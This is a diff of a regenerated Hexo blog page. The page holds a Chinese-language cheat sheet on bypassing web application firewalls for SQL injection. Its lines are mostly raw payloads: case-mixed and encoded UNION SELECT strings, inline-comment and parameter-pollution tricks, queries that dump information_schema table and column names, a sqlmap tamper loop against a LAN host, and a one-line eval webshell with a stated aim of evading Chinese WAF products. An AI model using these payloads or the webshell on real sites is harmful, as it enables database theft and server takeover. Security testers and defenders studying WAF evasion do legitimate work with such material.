@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/01/15/cross-waf/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#过waf" title="过waf">过waf</a>
+                        <a class="tag" href="/tags/#过waf"
+                           title="过waf">过waf</a>
                         
                     </div>
                 </div>
@@ -171,7 +179,7 @@
 <p>绕过waf的方式：</p>
 <p>1.大小写混合<br>2.替换关键字<code>selselectect 1,2,3,4</code><br>3.使用编码<code>%55</code><br>4.使用注释 <code>union/**/select 1,2,4,</code><br>5.特殊符号<br>6.等价函数    <code>@@user=user()</code><br>7.HTTP参数控制<br>8.缓冲区溢出fuzz<br>9.整合绕过</p>
 <p>-&gt;1.大小写绕过<br>    用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
-<p>举例：<code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</code></p>
+<p>举例：<code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 </code></p>
 <p>-&gt;2.替换关键字<br>    这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p>
 <p>-&gt;3.使用编码</p>
 <p>3.1.URL编码</p>
@@ -189,24 +197,24 @@
 <p>左括号：<code>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</code></p>
 <p>右括号：<code>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></p>
 <p>举例：<code>?id=10%D6‘%20AND%201=2%23</code></p>
-<p>　　　<code>SELECT &#39;Ä&#39;=&#39;A&#39;; #1</code><br>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p>
+<p>　　　<code>SELECT &#39;Ä&#39;=&#39;A&#39;; #1</code><br>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成&#39;，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p>
 <p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p>
 <p>另外utf-7的绕过，还有utf-16、utf-32的绕过</p>
 <p>-&gt;4. 使用注释    <code>//, -- , /**/, #, --+,--  -, ;，--a</code></p>
 <p>常见的用于注释的符号有哪些：<code>//, -- , /**/, #, --+,--  -, ;，--a</code></p>
 <p>4.1.普通注释</p>
-<p>举例：<code>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</code>　</p>
-<p>　　<code>&#39;union%a0select pass from users#</code></p>
+<p>举例：<code>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　</code>　</p>
+<p>　　<code>　&#39;union%a0select pass from users#</code></p>
 <p>/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p>
 <p>4.2.内联注释</p>
 <p>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p>
 <p>举例：<code>index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></p>
 <p>　　　<code>?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></p>
 <p>​            两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
-<p>-&gt;5.特殊符号    非字母数字的字符，包括<code></code>、~、!、@、%、()、[]、.、-、+ 、|、%00`等</p>
-<p>5.1.使用反引号<code>，例如select `</code>version()<code></code>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+<p>-&gt;5.特殊符号    非字母数字的字符，包括``、~、!、@、%、()、[]、.、-、+ 、|、%00`等</p>
+<p>5.1.使用反引号`，例如select <code>version()</code>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
 <p>5.2.神奇的<code>&quot;-+.&quot;，select+id-1+1.from users;</code> “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p>
-<p>5.3.@符号，<code>select@^1.from users;</code>@用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p>
+<p>5.3.@符号，<code>select@^1.from users; </code>@用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p>
 <p>5.4.<code>Mysql function() as xxx</code>  也可不用as和空格　　<code>select-count(id)test from users;</code> //绕过空格限制</p>
 <p>5.5.关键字拆分：<code>‘se’+’lec’+’t’</code></p>
 <p>　　　　　　<code>%S%E%L%E%C%T 1</code></p>
@@ -225,8 +233,8 @@ mid()、substr() ==&gt; substring()
 
 @@user ==&gt; user()
 
-@@datadir ==&gt; datadir()
-</code></pre><p>6.2.符号</p>
+@@datadir ==&gt; datadir()</code></pre>
+<p>6.2.符号</p>
 <p>and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试<code>&lt;、&gt;</code>，因为如果不小于又不大于，那边是等于了</p>
 <p>在看一下用得多的空格，可以使用如下符号表示其作用：<code>%20 %09 %0a %0b %0c %0d %a0 /**/</code></p>
 <p>6.3生僻字</p>
@@ -240,15 +248,16 @@ mid()、substr() ==&gt; substring()
 <p>​    <code>/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</code></p>
 <p>　　<code>/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></p>
 <p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3。不同服务器处理的方式不同：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asp.net/IIS -&gt;par1=val1,val2</span><br><span class="line"></span><br><span class="line">ASP/IIS -&gt; 	par1= val1,val2</span><br><span class="line"></span><br><span class="line">PHP/Apache-&gt;parl=val2</span><br><span class="line"></span><br><span class="line">JSP/Tomcat-&gt;par1=val1</span><br><span class="line"></span><br><span class="line">Pell/Apache-&gt;par1=val1</span><br><span class="line"></span><br><span class="line">DBMan	-&gt;par1=vall~~val2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asp.net&#x2F;IIS -&gt;par1&#x3D;val1,val2</span><br><span class="line"></span><br><span class="line">ASP&#x2F;IIS -&gt; 	par1&#x3D; val1,val2</span><br><span class="line"></span><br><span class="line">PHP&#x2F;Apache-&gt;parl&#x3D;val2</span><br><span class="line"></span><br><span class="line">JSP&#x2F;Tomcat-&gt;par1&#x3D;val1</span><br><span class="line"></span><br><span class="line">Pell&#x2F;Apache-&gt;par1&#x3D;val1</span><br><span class="line"></span><br><span class="line">DBMan	-&gt;par1&#x3D;vall~~val2</span><br></pre></td></tr></table></figure>
+
 <p>7.2.HPF(HTTP Parameter Fragment)<br>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)<br>    举例：　</p>
-<p>　　<code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></p>
+<p>　　<code>    /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></p>
 <p>　　<code>select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</code></p>
 <p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p>
 <p>7.3.HPC(HTTP Parameter Contamination)</p>
 <p>这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p>
 <p>RFC2396定义了如下一些字符：</p>
-<p><code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &#39; ()</code><br>    <code>Reserved : ; / ? : @ &amp; = + $ ,</code><br>    <code>Unwise : { } | \ ^ [ ]</code></p>
+<p><code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &#39; ()</code><br>    <code>Reserved : ; / ? : @ &amp; = + $ ,</code><br>    <code>Unwise : &#123; &#125; | \ ^ [ ] </code></p>
 <p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：</p>
 <p>-&gt;8.缓冲区溢出<br>        缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
 <p>举例：</p>
@@ -258,10 +267,10 @@ mid()、substr() ==&gt; substring()
 <p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>
 <p>举例：<br>    <code>z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</code></p>
 <p><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</code></p>
-<p><code>?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</code>    </p>
+<p><code>?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--      </code>    </p>
 <p>绕过安全狗新思路：<code>select 1,2,3/*%00*//*!50001from*/user</code></p>
 <p>sqlmap —-tamper参数的使用</p>
-<p>依次尝试每个tamper脚本：<code>for t in</code>ls /usr/share/sqlmap/tamper/*.py<code></code>; do echo -e “e[41;1m tamper: $te[0m”; sqlmap -u “<a href="http://192.168.1.100/sql.asp?id=1&quot;" target="_blank" rel="noopener">http://192.168.1.100/sql.asp?id=1&quot;</a> –dbs –random-agent –smart –batch –tamper $t –threads 10;done;`</p>
+<p>依次尝试每个tamper脚本：<code>for t in </code>ls /usr/share/sqlmap/tamper/*.py``; do echo -e “e[41;1m tamper: $te[0m”; sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.1.100/sql.asp?id=1&quot;">http://192.168.1.100/sql.asp?id=1&quot;</a> –dbs –random-agent –smart –batch –tamper $t –threads 10;done;`</p>
 <p>普通tamper搭配方式:</p>
 <p><code>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></p>
 <p>数据库为MSSQL的搭配方式:</p>
@@ -279,11 +288,11 @@ mid()、substr() ==&gt; substring()
 </blockquote>
 <p><code>eval request（&quot;pass&quot;）</code></p>
 <p>大马：不需要菜刀，本身集成了很多工具，如404</p>
-<p>PHP木马变形：<em>**</em>需要了解</p>
+<p>PHP木马变形：****需要了解</p>
 <pre><code>create_function(string $args,string $code)
 string $args
-string $code
-</code></pre><p>​<br>安全工具：安全狗、D盾</p>
+string $code</code></pre>
+<p>​<br>安全工具：安全狗、D盾</p>
 <p>要求：写一句话过D盾和安全狗</p>
 
                 <hr>
@@ -292,12 +301,14 @@ string $code
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top" title="shell_rebound">&larr; Previous Post</a>
+                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top"
+                           title="shell_rebound">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/01/13/file-update/" data-toggle="tooltip" data-placement="top" title="'file_update'">Next Post &rarr;</a>
+                        <a href="/2019/01/13/file-update/" data-toggle="tooltip" data-placement="top"
+                           title="'file_update'">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -368,11 +379,11 @@ string $code
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -381,13 +392,19 @@ string $code
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
